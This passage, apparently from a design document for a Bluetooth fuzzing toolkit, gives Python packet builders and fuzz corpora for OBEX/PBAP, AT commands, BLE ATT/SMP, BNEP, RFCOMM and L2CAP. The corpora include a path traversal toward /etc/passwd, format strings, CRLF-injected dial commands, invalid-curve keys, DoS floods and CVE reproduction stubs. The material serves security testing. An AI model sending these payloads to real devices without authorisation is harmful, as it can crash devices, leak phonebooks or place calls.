    """Unicode header: HI(1) + Length(2 BE inclusive) + UTF-16BE(null-terminated)."""
    encoded = text.encode("utf-16-be") + b"\x00\x00"
    length = 1 + 2 + len(encoded)
    return bytes([hi]) + struct.pack(">H", length) + encoded

def build_byteseq_header(hi: int, data: bytes) -> bytes:
    """Byte sequence header: HI(1) + Length(2 BE inclusive) + data."""
    length = 1 + 2 + len(data)
    return bytes([hi]) + struct.pack(">H", length) + data

def build_byte4_header(hi: int, value: int) -> bytes:
    """4-byte header: HI(1) + Value(4 BE). Total 5 bytes, no length field."""
    return bytes([hi]) + struct.pack(">I", value)

def build_obex_packet(opcode: int, body: bytes) -> bytes:
    """Generic OBEX packet: Opcode(1) + Length(2 BE inclusive) + body."""
    length = 1 + 2 + len(body)
    return bytes([opcode]) + struct.pack(">H", length) + body

def build_connect(target_uuid: bytes | None = None, version: int = 0x10,
                  flags: int = 0x00, max_pkt_len: int = 0xFFFF) -> bytes:
    """OBEX Connect: special format with version/flags/maxpktlen before headers."""
    body = struct.pack(">BBH", version, flags, max_pkt_len)
    if target_uuid:
        body += build_byteseq_header(HI_TARGET, target_uuid)
    length = 1 + 2 + len(body)
    return bytes([OBEX_CONNECT]) + struct.pack(">H", length) + body

def build_setpath(name: str | None = None, backup: bool = False,
                  no_create: bool = True) -> bytes:
    flags = (0x01 if backup else 0x00) | (0x02 if no_create else 0x00)
    body = bytes([flags, 0x00])
    if name is not None:
        body += build_unicode_header(HI_NAME, name)
    length = 1 + 2 + len(body)
    return bytes([OBEX_SETPATH]) + struct.pack(">H", length) + body

def build_get(connection_id: int, name: str, type_str: bytes,
              app_params: bytes = b"", final: bool = True) -> bytes:
    opcode = OBEX_GET_FINAL if final else OBEX_GET
    headers = build_byte4_header(HI_CONNECTION_ID, connection_id)
    headers += build_unicode_header(HI_NAME, name)
    headers += build_byteseq_header(HI_TYPE, type_str + b"\x00")
    if app_params:
        headers += build_byteseq_header(HI_APP_PARAMS, app_params)
    return build_obex_packet(opcode, headers)

def build_app_params(tags: list[tuple[int, bytes]]) -> bytes:
    """Build TLV-encoded application parameters."""
    result = b""
    for tag, value in tags:
        result += bytes([tag, len(value)]) + value
    return result

def build_pbap_connect() -> bytes:
    return build_connect(target_uuid=PBAP_TARGET_UUID)

def build_pbap_pull_phonebook(path: str = "telecom/pb.vcf",
                              max_count: int = 0xFFFF, offset: int = 0,
                              fmt: int = 0) -> bytes:
    app_params = build_app_params([
        (PBAP_TAG_MAX_LIST_COUNT, struct.pack(">H", max_count)),
        (PBAP_TAG_LIST_START_OFFSET, struct.pack(">H", offset)),
        (PBAP_TAG_FORMAT, bytes([fmt])),
    ])
    # Assumes connection_id=1 (will be set by caller)
    return build_get(1, path, PBAP_TYPE_PHONEBOOK, app_params)

def build_map_connect() -> bytes:
    return build_connect(target_uuid=MAP_MAS_TARGET_UUID)
```

#### 2.2.12: OBEX Fuzzing Helpers

```python
def fuzz_packet_length(packet: bytes) -> list[bytes]:
    """Generate variants with corrupted packet length field."""
    results = []
    for new_len in [0, 1, 2, len(packet) - 1, len(packet) + 1, 0xFFFF]:
        mutated = packet[0:1] + struct.pack(">H", new_len) + packet[3:]
        results.append(mutated)
    return results

def fuzz_header_length(header: bytes) -> list[bytes]:
    """Corrupt a variable-length header's length field."""
    if len(header) < 3: return [header]
    results = []
    for new_len in [0, 1, 2, 0xFFFF]:
        mutated = header[0:1] + struct.pack(">H", new_len) + header[3:]
        results.append(mutated)
    return results

def build_path_traversal_name(depth: int = 5) -> bytes:
    """Build Name header with ../../../etc/passwd in UTF-16BE."""
    path = "../" * depth + "etc/passwd"
    return build_unicode_header(HI_NAME, path)

def fuzz_app_param_tlv_overflow() -> bytes:
    """AppParam TLV where Length exceeds remaining data."""
    return build_byteseq_header(HI_APP_PARAMS, bytes([0x04, 0xFF, 0x00]))

def fuzz_obex_session_attacks() -> list[list[bytes]]:
    """Multi-packet session attacks (out-of-order, double-connect, etc.)."""
    return [
        [build_get(1, "pb.vcf", PBAP_TYPE_PHONEBOOK)],  # Get before Connect
        [build_pbap_connect(), build_pbap_connect()],     # Double Connect
        [build_pbap_connect(), build_obex_packet(OBEX_ABORT, b"")],  # Abort nothing
        [build_obex_packet(OBEX_DISCONNECT, b""), build_pbap_pull_phonebook()],  # Get after Disconnect
    ]
```

---

### TASK 2.3: AT Command Corpus Generator

**File**: `bt_tap/fuzz/protocols/at_commands.py`

```python
class ATCorpus:
    """Generate protocol-aware AT command fuzzing payloads."""

    @staticmethod
    def generate_hfp_corpus() -> list[bytes]:
        """HFP SLC + call control commands with boundary values."""
        corpus = []
        # BRSF: valid and boundary feature bitmasks
        for val in [0, 1, 127, 255, 1023, 2047, 0x7FFFFFFF, 0xFFFFFFFF, -1]:
            corpus.append(f"AT+BRSF={val}\r".encode())
        # BAC: codec IDs
        for val in ["1,2", "1", "1,2,3", "0", "255", "1,2,3,4,5,6,7,8,9,10", ""]:
            corpus.append(f"AT+BAC={val}\r".encode())
        # CIND variations
        corpus.extend([b"AT+CIND=?\r", b"AT+CIND?\r", b"AT+CIND\r", b"AT+CIND=\r"])
        # CMER variations
        for args in ["3,0,0,1", "0,0,0,0", "255,255,255,255", "", "3"]:
            corpus.append(f"AT+CMER={args}\r".encode())
        # CHLD variations
        for action in [0, 1, 2, 3, 4, 99, "1x", "2x"]:
            corpus.append(f"AT+CHLD={action}\r".encode())
        # Volume: 0-15 valid, boundary values
        for vol in [0, 1, 15, 16, 255, -1]:
            corpus.append(f"AT+VGS={vol}\r".encode())
            corpus.append(f"AT+VGM={vol}\r".encode())
        # Dial: various lengths and formats
        for num in ["", "1", "911", "+14155551234", "1" * 100, "1" * 1000,
                    "*#123#", "+", "ATD", "\\x00"]:
            corpus.append(f"ATD{num};\r".encode())
        # DTMF
        for dtmf in ["0", "9", "A", "D", "#", "*", "0123456789", "X", ""]:
            corpus.append(f"AT+VTS={dtmf}\r".encode())
        # CLCC, COPS, CNUM
        corpus.extend([b"AT+CLCC\r", b"AT+COPS?\r", b"AT+CNUM\r"])
        # BVRA (voice recognition)
        for val in [0, 1, 2, 255]:
            corpus.append(f"AT+BVRA={val}\r".encode())
        # NREC
        for val in [0, 1, 2, 255]:
            corpus.append(f"AT+NREC={val}\r".encode())
        return corpus

    @staticmethod
    def generate_phonebook_corpus() -> list[bytes]:
        """Phonebook AT commands with boundary values."""
        corpus = []
        # CPBS: select memory
        for mem in ['"ME"', '"SM"', '"DC"', '"RC"', '"MC"', '"FD"', '"ON"', '"LD"', '"EN"',
                    '""', '"AAAA"', '"' + 'A' * 256 + '"', '"\x00"']:
            corpus.append(f"AT+CPBS={mem}\r".encode())
        corpus.append(b"AT+CPBS=?\r")
        corpus.append(b"AT+CPBS?\r")
        # CPBR: read entries
        for args in ["1", "1,10", "1,200", "0,1", "1,99999", "200,1",
                      "-1,10", "0", "0,0", "1,1"]:
            corpus.append(f"AT+CPBR={args}\r".encode())
        # CPBF: find
        for search in ["John", "", "A" * 1024, "\x00", "%n%s"]:
            corpus.append(f'AT+CPBF="{search}"\r'.encode())
        # CPBW: write (potentially destructive, careful in real use)
        corpus.append(b'AT+CPBW=1,"+14155551234",145,"Test"\r')
        corpus.append(f'AT+CPBW=1,"{"1"*1000}",145,"{"A"*500}"\r'.encode())
        return corpus

    @staticmethod
    def generate_sms_corpus() -> list[bytes]:
        """SMS AT commands."""
        corpus = []
        # CMGF (text mode)
        for val in [0, 1, 2, 255]:
            corpus.append(f"AT+CMGF={val}\r".encode())
        # CMGL
        for stat in ['"ALL"', '"REC UNREAD"', '"REC READ"', '"STO UNSENT"', '"STO SENT"',
                     '""', '"INVALID"', "0", "1", "2", "3", "4", "255"]:
            corpus.append(f"AT+CMGL={stat}\r".encode())
        # Device info
        corpus.extend([b"AT+CGSN\r", b"AT+CIMI\r", b"AT+CSQ\r", b"AT+CBC\r", b"AT+COPS?\r"])
        return corpus

    @staticmethod
    def generate_injection_corpus() -> list[bytes]:
        """Injection, overflow, and encoding attacks."""
        corpus = []
        # Buffer overflows
        for n in [128, 256, 512, 1024, 4096, 8192]:
            corpus.append(f"AT{'A' * n}\r".encode())
            corpus.append(f"AT+{'B' * n}\r".encode())
            corpus.append(f"AT+BRSF={'9' * n}\r".encode())
        # Null bytes
        corpus.append(b"AT+BRSF=\x001\x005\r")
        corpus.append(b"AT\x00+BRSF=127\r")
        corpus.append(b"AT+CPBS=\"\x00ME\"\r")
        # Format strings
        for fmt in ["%n%n%x%x", "%s%s%s%s", "%p%p%p%p", "%.1024d", "%99999c"]:
            corpus.append(f"AT+CPBR={fmt}\r".encode())
            corpus.append(f"AT+BRSF={fmt}\r".encode())
        # CRLF injection
        corpus.append(b"AT+BRSF=127\r\nAT+CHUP\r\n")
        corpus.append(b"AT+CPBS=\"ME\"\r\nATD911;\r\n")
        # Unicode overflow
        for n in [128, 256, 512]:
            corpus.append(("AT+" + "\u00c4" * n + "\r").encode("utf-8"))
        # Missing terminator
        corpus.append(b"AT+BRSF=127")
        # Double terminator
        corpus.append(b"AT+BRSF=127\r\n\r\n")
        # A/ repetition
        corpus.append(b"A/\r")
        # Command concatenation
        corpus.append(b"AT+BRSF=127;+CIND=?\r")
        concat = "AT" + ";+A" * 500 + "\r"
        corpus.append(concat.encode())
        # Empty and minimal
        corpus.append(b"\r")
        corpus.append(b"AT\r")
        corpus.append(b"AT+\r")
        corpus.append(b"AT+=\r")
        corpus.append(b"AT+BRSF=\r")
        # Non-ASCII
        corpus.append(b"AT+\x80\x81\x82\r")
        corpus.append(b"AT+BRSF=\xff\xfe\r")
        return corpus

    @classmethod
    def generate_all(cls) -> list[bytes]:
        return (cls.generate_hfp_corpus() + cls.generate_phonebook_corpus() +
                cls.generate_sms_corpus() + cls.generate_injection_corpus())
```

---

### TASK 2.4: BLE ATT Protocol Builder

**File**: `bt_tap/fuzz/protocols/att.py`

```python
import struct

# ATT Opcodes
ATT_ERROR_RSP               = 0x01
ATT_EXCHANGE_MTU_REQ        = 0x02; ATT_EXCHANGE_MTU_RSP        = 0x03
ATT_FIND_INFO_REQ           = 0x04; ATT_FIND_INFO_RSP           = 0x05
ATT_FIND_BY_TYPE_VALUE_REQ  = 0x06; ATT_FIND_BY_TYPE_VALUE_RSP  = 0x07
ATT_READ_BY_TYPE_REQ        = 0x08; ATT_READ_BY_TYPE_RSP        = 0x09
ATT_READ_REQ                = 0x0A; ATT_READ_RSP                = 0x0B
ATT_READ_BLOB_REQ           = 0x0C; ATT_READ_BLOB_RSP           = 0x0D
ATT_READ_MULTIPLE_REQ       = 0x0E; ATT_READ_MULTIPLE_RSP       = 0x0F
ATT_READ_BY_GROUP_TYPE_REQ  = 0x10; ATT_READ_BY_GROUP_TYPE_RSP  = 0x11
ATT_WRITE_REQ               = 0x12; ATT_WRITE_RSP               = 0x13
ATT_PREPARE_WRITE_REQ       = 0x16; ATT_PREPARE_WRITE_RSP       = 0x17
ATT_EXECUTE_WRITE_REQ       = 0x18; ATT_EXECUTE_WRITE_RSP       = 0x19
ATT_HANDLE_VALUE_NTF        = 0x1B
ATT_HANDLE_VALUE_IND        = 0x1D; ATT_HANDLE_VALUE_CFM        = 0x1E
ATT_WRITE_CMD               = 0x52; ATT_SIGNED_WRITE_CMD        = 0xD2

# Error Codes
ATT_ERR_INVALID_HANDLE      = 0x01; ATT_ERR_READ_NOT_PERMITTED  = 0x02
ATT_ERR_WRITE_NOT_PERMITTED = 0x03; ATT_ERR_INVALID_PDU         = 0x04
ATT_ERR_INSUFF_AUTH         = 0x05; ATT_ERR_REQ_NOT_SUPPORTED   = 0x06
ATT_ERR_INVALID_OFFSET      = 0x07; ATT_ERR_INSUFF_AUTHOR       = 0x08
ATT_ERR_PREP_QUEUE_FULL     = 0x09; ATT_ERR_ATTR_NOT_FOUND      = 0x0A
ATT_ERR_ATTR_NOT_LONG       = 0x0B; ATT_ERR_INSUFF_ENC_KEY      = 0x0C
ATT_ERR_INVALID_VALUE_LEN   = 0x0D; ATT_ERR_UNLIKELY            = 0x0E
ATT_ERR_INSUFF_ENC          = 0x0F; ATT_ERR_UNSUPPORTED_GROUP   = 0x10
ATT_ERR_INSUFF_RESOURCES    = 0x11

# GATT UUIDs
UUID_PRIMARY_SERVICE = 0x2800; UUID_SECONDARY_SERVICE = 0x2801
UUID_CHARACTERISTIC  = 0x2803; UUID_CCCD              = 0x2902

def build_exchange_mtu_req(mtu: int) -> bytes:
    return struct.pack("<BH", ATT_EXCHANGE_MTU_REQ, mtu)

def build_find_info_req(start: int, end: int) -> bytes:
    return struct.pack("<BHH", ATT_FIND_INFO_REQ, start, end)

def build_read_by_type_req(start: int, end: int, uuid: int | bytes) -> bytes:
    pdu = struct.pack("<BHH", ATT_READ_BY_TYPE_REQ, start, end)
    if isinstance(uuid, int):
        pdu += struct.pack("<H", uuid)
    else:
        pdu += uuid  # 16-byte UUID128
    return pdu

def build_read_req(handle: int) -> bytes:
    return struct.pack("<BH", ATT_READ_REQ, handle)

def build_read_blob_req(handle: int, offset: int) -> bytes:
    return struct.pack("<BHH", ATT_READ_BLOB_REQ, handle, offset)

def build_read_by_group_type_req(start: int, end: int, uuid: int) -> bytes:
    return struct.pack("<BHH", ATT_READ_BY_GROUP_TYPE_REQ, start, end) + struct.pack("<H", uuid)

def build_write_req(handle: int, value: bytes) -> bytes:
    return struct.pack("<BH", ATT_WRITE_REQ, handle) + value

def build_write_cmd(handle: int, value: bytes) -> bytes:
    return struct.pack("<BH", ATT_WRITE_CMD, handle) + value

def build_prepare_write_req(handle: int, offset: int, value: bytes) -> bytes:
    return struct.pack("<BHH", ATT_PREPARE_WRITE_REQ, handle, offset) + value

def build_execute_write_req(flags: int = 0x01) -> bytes:
    return struct.pack("<BB", ATT_EXECUTE_WRITE_REQ, flags)

def build_handle_value_ntf(handle: int, value: bytes) -> bytes:
    """Send notification FROM CLIENT (invalid — tests server handling)."""
    return struct.pack("<BH", ATT_HANDLE_VALUE_NTF, handle) + value

def build_handle_value_cfm() -> bytes:
    """Send confirmation without prior indication."""
    return bytes([ATT_HANDLE_VALUE_CFM])


# === Fuzz Case Generators ===

def fuzz_handles() -> list[bytes]:
    """Fuzz handle values across all relevant opcodes."""
    cases = []
    for handle in [0x0000, 0x0001, 0xFFFE, 0xFFFF]:
        cases.append(build_read_req(handle))
        cases.append(build_write_req(handle, b"\x00"))
        cases.append(build_read_blob_req(handle, 0))
        cases.append(build_prepare_write_req(handle, 0, b"\x00"))
    return cases

def fuzz_range_reversed() -> list[bytes]:
    """StartHandle > EndHandle (should return error)."""
    return [
        build_find_info_req(0x0005, 0x0001),
        build_read_by_type_req(0xFFFF, 0x0001, UUID_CHARACTERISTIC),
        build_read_by_group_type_req(0x0010, 0x0001, UUID_PRIMARY_SERVICE),
        build_find_info_req(0x0000, 0x0000),
    ]

def fuzz_mtu_values() -> list[bytes]:
    """MTU exchange with interesting values."""
    return [build_exchange_mtu_req(m) for m in [0, 1, 22, 23, 24, 255, 256, 512, 517, 0xFFFF]]

def fuzz_write_sizes() -> list[bytes]:
    """Write with various payload sizes."""
    cases = []
    for size in [0, 1, 20, 22, 23, 100, 255, 512, 0xFFFF]:
        cases.append(build_write_req(0x0003, os.urandom(min(size, 512))))
        cases.append(build_write_cmd(0x0003, os.urandom(min(size, 512))))
    return cases

def fuzz_prepare_write_overflow() -> list[bytes]:
    """Prepare Write with large offsets (CVE-2024-24746 pattern)."""
    cases = []
    for offset in [0, 1, 0x7FFF, 0xFFFE, 0xFFFF]:
        for size in [1, 100, 512]:
            cases.append(build_prepare_write_req(0x0003, offset, os.urandom(size)))
    # Execute Write without prior Prepare
    cases.append(build_execute_write_req(0x01))
    # Execute Write with cancel
    cases.append(build_execute_write_req(0x00))
    # Execute Write with invalid flags
    cases.append(build_execute_write_req(0xFF))
    return cases

def fuzz_unknown_opcodes() -> list[bytes]:
    """Every undefined ATT opcode."""
    defined = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,
               0x0E,0x0F,0x10,0x11,0x12,0x13,0x16,0x17,0x18,0x19,0x1B,0x1D,0x1E,0x52,0xD2}
    return [bytes([op]) + b"\x01\x00" for op in range(256) if op not in defined]

def fuzz_invalid_uuid_sizes() -> list[bytes]:
    """ReadByType with non-standard UUID sizes (not 2 or 16 bytes)."""
    cases = []
    for size in [1, 3, 4, 5, 8, 15, 17, 32]:
        pdu = struct.pack("<BHH", ATT_READ_BY_TYPE_REQ, 0x0001, 0xFFFF) + os.urandom(size)
        cases.append(pdu)
    return cases

def fuzz_rapid_sequential_requests(count: int = 50) -> list[bytes]:
    """SweynTooth deadlock pattern: rapid requests without waiting for response."""
    return [build_read_req(0x0001) for _ in range(count)]

def generate_all_att_fuzz_cases() -> list[bytes]:
    """All ATT fuzz cases combined."""
    return (fuzz_handles() + fuzz_range_reversed() + fuzz_mtu_values() +
            fuzz_write_sizes() + fuzz_prepare_write_overflow() +
            fuzz_unknown_opcodes() + fuzz_invalid_uuid_sizes())
```

---

### TASK 2.5: BLE SMP Protocol Builder

**File**: `bt_tap/fuzz/protocols/smp.py`

```python
import struct, os

# SMP Commands
SMP_PAIRING_REQUEST     = 0x01; SMP_PAIRING_RESPONSE    = 0x02
SMP_PAIRING_CONFIRM     = 0x03; SMP_PAIRING_RANDOM      = 0x04
SMP_PAIRING_FAILED      = 0x05; SMP_ENCRYPTION_INFO     = 0x06
SMP_CENTRAL_ID          = 0x07; SMP_IDENTITY_INFO       = 0x08
SMP_IDENTITY_ADDR_INFO  = 0x09; SMP_SIGNING_INFO        = 0x0A
SMP_SECURITY_REQUEST    = 0x0B; SMP_PAIRING_PUBLIC_KEY  = 0x0C
SMP_PAIRING_DHKEY_CHECK = 0x0D; SMP_KEYPRESS_NTF        = 0x0E

# IO Capabilities
IO_DISPLAY_ONLY     = 0x00; IO_DISPLAY_YESNO    = 0x01
IO_KEYBOARD_ONLY    = 0x02; IO_NO_INPUT_OUTPUT  = 0x03
IO_KEYBOARD_DISPLAY = 0x04

def build_pairing_request(io_cap=IO_NO_INPUT_OUTPUT, oob=0, auth_req=0x01,
                          max_key_size=16, init_key_dist=0x07, resp_key_dist=0x07) -> bytes:
    return struct.pack("BBBBBBB", SMP_PAIRING_REQUEST, io_cap, oob,
                       auth_req, max_key_size, init_key_dist, resp_key_dist)

def build_pairing_confirm(confirm_value: bytes) -> bytes:
    return bytes([SMP_PAIRING_CONFIRM]) + confirm_value[:16].ljust(16, b"\x00")

def build_pairing_random(random_value: bytes) -> bytes:
    return bytes([SMP_PAIRING_RANDOM]) + random_value[:16].ljust(16, b"\x00")

def build_pairing_failed(reason: int = 0x08) -> bytes:
    return bytes([SMP_PAIRING_FAILED, reason])

def build_pairing_public_key(x: bytes, y: bytes) -> bytes:
    return bytes([SMP_PAIRING_PUBLIC_KEY]) + x[:32].ljust(32, b"\x00") + y[:32].ljust(32, b"\x00")

def build_security_request(auth_req: int = 0x01) -> bytes:
    return bytes([SMP_SECURITY_REQUEST, auth_req])


# === Fuzz Case Generators ===

def fuzz_io_capabilities() -> list[bytes]:
    return [build_pairing_request(io_cap=i) for i in range(256)]

def fuzz_max_key_size() -> list[bytes]:
    return [build_pairing_request(max_key_size=k) for k in [0, 1, 6, 7, 8, 16, 17, 255]]

def fuzz_auth_req() -> list[bytes]:
    return [build_pairing_request(auth_req=a) for a in [0x00, 0x01, 0x05, 0x09, 0x0D, 0x3F, 0xFF]]

def fuzz_public_key_invalid_curve() -> list[bytes]:
    """CVE-2018-5383 pattern: invalid ECDH curve points."""
    return [
        build_pairing_public_key(b"\x00" * 32, b"\x00" * 32),  # Zero point
        build_pairing_public_key(b"\xFF" * 32, b"\xFF" * 32),  # Max values
        build_pairing_public_key(os.urandom(32), os.urandom(32)),  # Random (likely not on curve)
    ]

def fuzz_out_of_sequence() -> list[list[bytes]]:
    """Out-of-order SMP commands."""
    return [
        [build_pairing_confirm(os.urandom(16))],  # Confirm without Request
        [build_pairing_random(os.urandom(16))],    # Random without Confirm
        [build_pairing_public_key(os.urandom(32), os.urandom(32))],  # PubKey without Request
        [build_pairing_failed(0x08), build_pairing_confirm(os.urandom(16))],  # Failed then continue
    ]

def fuzz_repeated_pairing(count: int = 50) -> list[bytes]:
    """Rapid-fire pairing requests (DoS)."""
    return [build_pairing_request() for _ in range(count)]
```

---

### TASK 2.6: BNEP Protocol Builder

**File**: `bt_tap/fuzz/protocols/bnep.py`

```python
BNEP_GENERAL_ETHERNET = 0x00
BNEP_CONTROL          = 0x01
BNEP_COMPRESSED       = 0x02

BNEP_SETUP_REQ        = 0x01
BNEP_SETUP_RSP        = 0x02
BNEP_FILTER_NET_TYPE  = 0x03
BNEP_FILTER_MULTI     = 0x05

def build_setup_connection_req(uuid_size: int = 2, src_uuid: bytes = b"", dst_uuid: bytes = b"") -> bytes:
    if not src_uuid: src_uuid = b"\x11\x15"  # PANU UUID16
    if not dst_uuid: dst_uuid = b"\x11\x16"  # NAP UUID16
    return bytes([BNEP_CONTROL, BNEP_SETUP_REQ, uuid_size]) + dst_uuid + src_uuid

def build_general_ethernet(dst: bytes, src: bytes, proto: int, payload: bytes) -> bytes:
    return bytes([BNEP_GENERAL_ETHERNET]) + dst + src + struct.pack(">H", proto) + payload

def fuzz_setup_uuid_sizes() -> list[bytes]:
    cases = []
    for size in [0, 1, 2, 4, 8, 16, 32, 255]:
        uuids = os.urandom(size * 2) if size > 0 else b""
        cases.append(bytes([BNEP_CONTROL, BNEP_SETUP_REQ, size]) + uuids)
    return cases

def fuzz_oversized_ethernet() -> list[bytes]:
    cases = []
    for size in [1500, 2000, 4096, 65535]:
        cases.append(build_general_ethernet(b"\xFF"*6, b"\xFF"*6, 0x0800, os.urandom(min(size, 4096))))
    return cases

def fuzz_invalid_control_types() -> list[bytes]:
    return [bytes([BNEP_CONTROL, ct]) for ct in range(256) if ct not in (1, 2, 3, 4, 5, 6)]
```

---

### TASK 2.7: RFCOMM Frame Builder

**File**: `bt_tap/fuzz/protocols/rfcomm.py`

```python
RFCOMM_SABM = 0x3F; RFCOMM_UA   = 0x73; RFCOMM_DM = 0x1F
RFCOMM_DISC = 0x53; RFCOMM_UIH  = 0xFF

def _calc_fcs(data: bytes) -> int:
    """CRC-8 per GSM 07.10."""
    CRC_TABLE = [...]  # 256-byte lookup table
    fcs = 0xFF
    for b in data:
        fcs = CRC_TABLE[fcs ^ b]
    return 0xFF - fcs

def build_address(dlci: int, cr: int = 1) -> int:
    return (dlci << 2) | (cr << 1) | 0x01  # EA=1

def build_length(length: int) -> bytes:
    if length <= 127:
        return bytes([(length << 1) | 0x01])
    else:
        return bytes([(length << 1) & 0xFE, (length >> 7) & 0xFF])

def build_rfcomm_frame(dlci: int, control: int, info: bytes = b"", fcs: int | None = None) -> bytes:
    addr = build_address(dlci)
    length = build_length(len(info))
    frame = bytes([addr, control]) + length + info
    if fcs is None:
        if control in (RFCOMM_SABM, RFCOMM_UA, RFCOMM_DM, RFCOMM_DISC):
            fcs = _calc_fcs(bytes([addr, control]) + length)
        else:
            fcs = _calc_fcs(bytes([addr, control]))
    return frame + bytes([fcs])

def build_sabm(dlci: int) -> bytes: return build_rfcomm_frame(dlci, RFCOMM_SABM)
def build_disc(dlci: int) -> bytes: return build_rfcomm_frame(dlci, RFCOMM_DISC)
def build_uih(dlci: int, data: bytes) -> bytes: return build_rfcomm_frame(dlci, RFCOMM_UIH, data)

def fuzz_rfcomm_frames() -> list[bytes]:
    cases = []
    # Wrong FCS
    cases.append(build_rfcomm_frame(2, RFCOMM_SABM, fcs=0x00))
    cases.append(build_rfcomm_frame(2, RFCOMM_SABM, fcs=0xFF))
    # Length mismatch
    frame = build_rfcomm_frame(2, RFCOMM_UIH, b"hello")
    cases.append(frame[:2] + bytes([0x01]) + frame[3:])  # Length=0
    # Invalid control byte
    for ctrl in [0x00, 0x01, 0x7F, 0x80, 0xFE]:
        cases.append(build_rfcomm_frame(2, ctrl, b"test"))
    # DLCI range
    for dlci in [0, 1, 62, 63]:
        cases.append(build_sabm(dlci))
    return cases
```

---

### TASK 2.8: L2CAP Signaling Builder

**File**: `bt_tap/fuzz/protocols/l2cap.py`

```python
"""L2CAP signaling command builders.

NOTE: These produce raw bytes. Sending requires Bumble or Scapy
(kernel handles L2CAP signaling, so normal sockets can't inject these).
"""

L2CAP_CMD_REJECT      = 0x01; L2CAP_CONN_REQ        = 0x02
L2CAP_CONN_RSP        = 0x03; L2CAP_CONF_REQ        = 0x04
L2CAP_CONF_RSP        = 0x05; L2CAP_DISCONN_REQ     = 0x06
L2CAP_ECHO_REQ        = 0x08; L2CAP_INFO_REQ        = 0x0A

L2CAP_CONF_OPT_MTU    = 0x01; L2CAP_CONF_OPT_FLUSH  = 0x02
L2CAP_CONF_OPT_QOS    = 0x03; L2CAP_CONF_OPT_RFC    = 0x04
L2CAP_CONF_OPT_FCS    = 0x05

def build_signaling_cmd(code: int, ident: int, data: bytes) -> bytes:
    return struct.pack("<BBH", code, ident, len(data)) + data

def build_connection_req(psm: int, scid: int) -> bytes:
    return build_signaling_cmd(L2CAP_CONN_REQ, 0x01, struct.pack("<HH", psm, scid))

def build_config_req(dcid: int, flags: int, options: bytes) -> bytes:
    return build_signaling_cmd(L2CAP_CONF_REQ, 0x02, struct.pack("<HH", dcid, flags) + options)

def build_config_option_mtu(mtu: int) -> bytes:
    return struct.pack("<BBH", L2CAP_CONF_OPT_MTU, 2, mtu)

def build_config_option_rfc(mode: int, tx_window: int = 1, max_transmit: int = 1,
                            retrans_timeout: int = 2000, monitor_timeout: int = 12000,
                            max_pdu: int = 672) -> bytes:
    return bytes([L2CAP_CONF_OPT_RFC, 9]) + struct.pack("<BBBHHH",
        mode, tx_window, max_transmit, retrans_timeout, monitor_timeout, max_pdu)

def build_echo_req(data: bytes) -> bytes:
    return build_signaling_cmd(L2CAP_ECHO_REQ, 0x04, data)

def build_info_req(info_type: int) -> bytes:
    return build_signaling_cmd(L2CAP_INFO_REQ, 0x05, struct.pack("<H", info_type))

def fuzz_config_options() -> list[bytes]:
    cases = []
    for mtu in [0, 1, 47, 48, 672, 0xFFFF]:
        cases.append(build_config_option_mtu(mtu))
    # Invalid option type
    cases.append(struct.pack("<BBH", 0xFF, 2, 0x0100))
    # Option length > remaining
    cases.append(struct.pack("<BB", L2CAP_CONF_OPT_MTU, 0xFF) + b"\x00\x01")
    # RFC with invalid mode
    cases.append(build_config_option_rfc(mode=0xFF))
    return cases
```

---

## EPIC 3: Fuzzing Strategies

---

### TASK 3.1: Random Walk Strategy

**File**: `bt_tap/fuzz/strategies/random_walk.py`

```python
class RandomWalkStrategy:
    def __init__(self, protocol_builder, mutator: ProtocolMutator):
        self.builder = protocol_builder
        self.mutator = mutator

    def generate(self, seed: bytes | None = None) -> tuple[bytes, list[str]]:
        """Generate one fuzz case by randomly mutating a template or seed."""
        if seed:
            mutated = CorpusMutator.mutate(seed, num_mutations=random.randint(1, 3))
            return mutated, [f"corpus_mutation({len(seed)}B)"]
        # Use protocol builder to get a structured template
        template = self.builder.random_valid_packet()
        fields = self.builder.parse_to_fields(template)
        mutated_fields, log = self.mutator.mutate_packet(fields, num_mutations=random.randint(1, 3))
        return self.builder.serialize(mutated_fields), log
```

### TASK 3.2: Targeted CVE Reproduction Strategy

**File**: `bt_tap/fuzz/strategies/targeted.py`

Pre-built attack sequences for known CVE patterns plus VARIATIONS.

```python
class TargetedStrategy:
    def cve_2017_0785_sdp_leak(self) -> Generator: ...
    def cve_2017_0781_bnep_heap(self) -> Generator: ...
    def sweyntooth_att_deadlock(self) -> Generator: ...
    def sweyntooth_att_large_mtu(self) -> Generator: ...
    def cve_2018_5383_invalid_curve(self) -> Generator: ...
    def cve_2024_24746_prepare_write(self) -> Generator: ...
```

Each method yields (payload, description) tuples: first the exact CVE reproduction, then mutations of the pattern.

### TASK 3.3: Response-Diversity Guided Strategy

**File**: `bt_tap/fuzz/strategies/coverage_guided.py`

```python
class CoverageGuidedStrategy:
    def __init__(self):
        self.response_fingerprints: set[str] = set()
        self.interesting_inputs: list[bytes] = []

    def _fingerprint(self, response: bytes | None) -> str:
        if response is None: return "timeout"
        return hashlib.md5(response[:32]).hexdigest()

    def feedback(self, input_bytes: bytes, response: bytes | None):
        fp = self._fingerprint(response)
        if fp not in self.response_fingerprints:
            self.response_fingerprints.add(fp)
            self.interesting_inputs.append(input_bytes)

    def generate(self) -> tuple[bytes, list[str]]:
        if self.interesting_inputs and random.random() < 0.8:
            seed = random.choice(self.interesting_inputs)
            return CorpusMutator.mutate(seed), ["coverage_guided_mutation"]
        return self._random_generation()
```

### TASK 3.4: State Machine Fuzzing Strategy

**File**: `bt_tap/fuzz/strategies/state_machine.py`

Multi-step protocol fuzzing with out-of-order attacks.

```python
class OBEXStateMachine:
    STATES = ["disconnected", "connected", "navigated", "getting", "putting"]

    def fuzz_transitions(self) -> list[list[bytes]]:
        """Generate invalid state transitions."""
        return [
            # Get before Connect
            [build_get(1, "pb.vcf", PBAP_TYPE_PHONEBOOK)],
            # Double Connect
            [build_pbap_connect(), build_pbap_connect()],
            # Disconnect then Get
            [build_pbap_connect(), build_obex_packet(OBEX_DISCONNECT, b""),
             build_get(1, "pb.vcf", PBAP_TYPE_PHONEBOOK)],
            # Put during Get
            [build_pbap_connect(), build_get(0, "pb.vcf", PBAP_TYPE_PHONEBOOK, final=False),
             build_obex_packet(OBEX_PUT_FINAL, build_byteseq_header(HI_END_OF_BODY, b"data"))],
        ]
```

---

## EPIC 4: CLI Integration

---

### TASK 4.1: Campaign Command

```python
@fuzz.command("campaign")
@click.argument("address", required=False, default=None)
@click.option("--protocol", "-p", multiple=True,
